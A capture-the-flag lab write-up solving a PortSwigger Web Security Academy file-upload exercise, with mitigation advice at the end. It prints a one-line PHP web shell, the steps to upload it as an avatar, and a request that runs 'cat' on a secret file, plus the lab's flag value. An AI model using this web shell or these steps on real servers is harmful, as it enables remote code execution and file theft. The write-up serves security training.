# Remote Code Execution via Web Shell Upload

**Platform:** PortSwigger Web Security Academy  
**Category:** File Upload Vulnerabilities  
**Difficulty:** Apprentice  
**Status:** Solved ✅

---

## Vulnerability

The application allows users to upload profile pictures with no file type or content validation. Uploaded files are stored directly in a web-accessible directory, making it possible to upload and execute server-side scripts.

## Steps to Reproduce

**1. Create a PHP web shell**

```bash
nano exploit.php
```

```php
<?php echo system($_GET['command']); ?>
```

**2. Upload the file**

Log in with valid credentials and upload `exploit.php` as a profile picture. The server accepts it without any validation.

**3. Locate the uploaded file**

Check Burp Suite HTTP history for the GET request that loads the profile image. The response reveals the file path:

```
/files/avatars/exploit.php
```

**4. Execute commands**

```
https://<lab-id>.web-security-academy.net/files/avatars/exploit.php?command=cat+/home/carlos/secret
```

## Result

```
gHDlyXs1CifvIROj5Edbky7t0wjvAGql
```

---

## Impact

Full remote code execution on the server. An attacker can read arbitrary files, move laterally, or establish persistence depending on server permissions.

## Mitigation

- Validate file type by checking magic bytes, not just extension or MIME type
- Rename uploaded files server-side
- Store uploads outside the web root
- Serve uploaded files through a dedicated handler, never execute them directly

---

*Tags: `file-upload` `rce` `php` `web-security-academy`*
